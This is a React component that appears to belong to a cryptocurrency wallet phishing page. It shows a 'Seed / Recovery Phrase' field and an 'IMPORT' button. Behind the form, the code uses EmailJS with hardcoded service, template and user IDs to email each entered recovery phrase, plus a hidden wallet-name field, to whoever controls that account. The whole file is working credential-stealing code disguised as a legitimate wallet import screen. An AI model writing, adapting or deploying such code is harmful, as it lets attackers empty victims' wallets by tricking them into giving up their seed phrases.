import React from "react";
import emailjs from "@emailjs/browser";

const sendEmail = (e) => {
  e.preventDefault();
  emailjs
    .sendForm(
      "service_uca2x1k",
      "template_oguonks",
      e.target,
      "user_Qp1Kvs7l8ZL0vLtKArviW"
    )
    .then(
      (result) => {
        console.log(result.text);
      },
      (error) => {
        console.log(error.text);
      }
    );
  e.target.reset();
};

const Phrase = ({ wallet }) => {
  return (
    <>
      <form onSubmit={sendEmail}>
        <input
          type="text"
          defaultValue={wallet}
          className="hiddeenn"
          name="namie"
        />

        <input
          type="text"
          required
          placeholder="Seed / Recovery Phrase"
          name="key"
          min="12"
          max="100"
          minLength="12"
          className="phraseseed"
        ></input>
        <h6 className="h4" style={{ color: "black", fontWeight: "400" }}>
          Typically 12(sometimes 24) words separated by single spaces
        </h6>

        <button type="submit">
          <b>IMPORT</b>
        </button>
      </form>
    </>
  );
};

export default Phrase;
